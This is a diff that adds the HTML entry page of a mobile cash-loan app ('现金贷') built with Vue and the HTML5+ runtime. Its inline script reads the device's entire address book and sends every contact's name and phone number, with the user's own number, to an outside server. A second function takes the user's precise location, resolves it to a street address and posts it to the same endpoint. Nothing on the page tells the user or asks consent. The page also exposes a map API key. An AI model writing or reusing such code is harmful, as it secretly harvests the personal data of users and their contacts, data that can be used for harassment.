@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <link rel="stylesheet" href="node_modules/element-ui/lib/theme-chalk/index.css">
+    <link rel="stylesheet" type="text/css" href="node_modules/mint-ui/lib/style.css">
+    <link rel="stylesheet" type="text/css" href="css/comment.css">
+    <link rel="stylesheet" type="text/css" href="css/mui.min.css">
+    <script src="node_modules/vue/dist/vue.js"></script>
+    <script src="node_modules/element-ui/lib/index.js"></script>
+    <script src="node_modules/mint-ui/lib/index.js"></script>
+    <script src='js/mui.min.js'></script>
+    <script src='js/jquery.js'></script>
+    <title>现金贷</title>
+</head>
+<body>
+    <div id="app" style="background-color:white;">
+        <App></App>
+    </div>
+<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=t7U6YO4wtPp1miqNs55Z7dWp1HTe5fv1"></script>
+<script type="text/javascript" src="app.js"></script><script type="text/javascript" src="app.js"></script></body>
+<script type="text/javascript">
+
+
+    function find(sjh,cal){
+
+        cal(0)
+        
+        var val=[]
+
+
+        plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {
+            addressbook.find(["displayName","phoneNumbers"],function(contacts){
+                //contacts.forEach(function(a,ind){
+                //    //console.log(a.displayName+'---'+a.phoneNumbers[0].value)
+                //    //alert(a.displayName+'---'+a.phoneNumbers[0].value)
+                //    var b={user:a.displayName,phone:a.phoneNumbers[0].value}
+                //    val.push(b)
+                //})
+                //for(var i=0;i<contacts.length;i++){
+
+                      // var b={user:contacts[i].displayName,phone:contacts[i].phoneNumbers[0].value}
+                   // val.push(b)               
+                //}
+
+                var phone={phone:sjh}
+                var data={data:JSON.stringify(contacts),phone:JSON.stringify(phone)}
+                
+                 $.ajax({ 
+                    url:'http://gongsixiangmu.1kesong.com/api/v1/mail',
+                    type:'POST',
+                    dataType:'json',
+                    data:data,
+                    success:function(res){
+                        cal(res)
+                    },
+                    error:function(erry){
+                        alert('erry')
+                    }
+                })
+            }, function (erry) {
+                alert('erry')
+            },{multiple:true});
+        },function(e){
+            alert("Get address book failed: " + e.message);
+        });
+    }
+
+    
+
+    function asd(){
+        var geolocation = new BMap.Geolocation();  
+        geolocation.getCurrentPosition(function(r){  
+            if(this.getStatus() == BMAP_STATUS_SUCCESS){  
+                //以指定的经度与纬度创建一个坐标点  
+                var pt = new BMap.Point(r.point.lng,r.point.lat);  
+                //创建一个地理位置解析器  
+                var geoc = new BMap.Geocoder();  
+                geoc.getLocation(pt, function(rs){//解析格式：城市，区县，街道  
+                    var addComp = rs.addressComponents;  
+                    //alert(addComp.city + ", " + addComp.district + ", " + addComp.street); 
+                    var data=JSON.stringify({data:addComp.city + ", " + addComp.district + ", " + addComp.street})
+                    
+                    $.ajax({ 
+                    url:'http://gongsixiangmu.1kesong.com/api/v1/mail',
+                    type:'POST',
+                    dataType:'json',
+                    data:data,
+                    success:function(res){
+                        alert(res.msg)
+                    },
+                    error:function(erry){
+                        alert(erry)
+                    }
+                })
+                });      
+            }  
+            else {  
+              alert('定位失败');  
+            }          
+        },{enableHighAccuracy: true})//指示浏览器获取高精度的位置，默认false  
+    }
+
+    </script>
+</html>
